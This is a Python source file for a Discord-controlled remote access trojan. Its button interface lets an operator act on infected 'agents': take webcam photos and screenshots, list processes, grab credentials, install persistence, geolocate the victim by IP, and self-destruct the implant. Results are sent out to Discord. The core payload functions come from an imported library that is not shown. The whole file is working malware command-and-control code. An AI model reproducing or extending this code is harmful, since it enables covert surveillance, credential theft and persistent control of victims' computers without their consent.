
import os
import sys
import discord
from discord.ext import commands
from libraries import maciassdopia

class InteractButton(discord.ui.View):
    def __init__(self, inv:str, id:int, bot:commands.Bot):
        super().__init__()
        self.inv = inv
        self.id = id
        self.bot = bot


    @discord.ui.button(label = "Interact", style = discord.ButtonStyle.blurple, emoji = "🔗")
    async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id

        my_embed = discord.Embed(
            title = f"Interacted with agent {self.id}",
            color = 0x00FF00
        )
        
        await interaction.response.send_message(
            embed = my_embed,
            ephemeral=True
        )


    @discord.ui.button(label = "Terminate", style = discord.ButtonStyle.gray, emoji = "❌")
    async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        my_embed = discord.Embed(
            title = f"Terminating Connection With Agent#{self.id}",
            color=0x00FF00
        )
        await interaction.response.send_message(embed = my_embed)
        await self.bot.close()
        sys.exit()


    @discord.ui.button(label = "Webshot", style = discord.ButtonStyle.gray, emoji = "📸")
    async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.webshot()
        if result != False:
            await interaction.response.send_message(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while taking photo of Agent#{self.id}",
                color=0xFF0000
            )
            await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Process", style = discord.ButtonStyle.gray, emoji = "📊")
    async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.process()
        if len(result) > 4000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file = discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"```\n{result}\n```")


    @discord.ui.button(label = "Screenshot", style = discord.ButtonStyle.gray, emoji = "🖼️")
    async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.screenshot()
        if result != False:
            await interaction.response.send_message(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while taking screenshot of Agent#{self.id}",
                color = 0xFF0000
            )
            await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Creds", style = discord.ButtonStyle.gray, emoji = "🔑")
    async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.creds()
        if result != False:
            await interaction.response.send_message(file = discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(
                title = f"Error while grabbing credentials from Agent#{self.id}",
                color = 0xFF0000
            )
            await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Persistent", style = discord.ButtonStyle.gray, emoji = "🔁")
    async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.persistent()
        if result:
            my_embed = discord.Embed(
                title = f"Persistance enabled on Agent#{self.id}",
                color = 0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title = f"Error while eanbling persistance on Agent#{self.id}",
                color = 0xFF0000
            )
        await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Location", style = discord.ButtonStyle.gray, emoji = "🌐")
    async def location(self, interaction:discord.Interaction, button:discord.ui.Button):
        response = maciassdopia.location()
        if response != False:
            my_embed = discord.Embed(
                title = f"IP Based Location on Agent#{self.id}",
                color = 0x00FF00
            )
            my_embed.add_field(name="IP:", value=f"**{response['ip']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response['hostname']}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{response['city']}**", inline=False)
            my_embed.add_field(name="Region:", value=f"**{response['region']}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{response['country']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response['org']}**", inline=False)
        else:
            my_embed = discord.Embed(
                title = f"Error while getting location of Agent{self.id}",
                color = 0xFF0000
            )
        await interaction.response.send_message(embed = my_embed)


    @discord.ui.button(label = "Selfdestruct", style = discord.ButtonStyle.red, emoji = "💣")
    async def selfdestruct(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = maciassdopia.selfdestruct()
        if result:
            my_embed = discord.Embed(
                title = f"Agent#{self.id} has been deleted",
                color = 0x00FF00
            )
        else:
            my_embed = discord.Embed(
                title = f"Error while deleting Agent#{self.id}: {result}",
                color = 0xFF0000
            )
        await interaction.response.send_message(embed = my_embed)
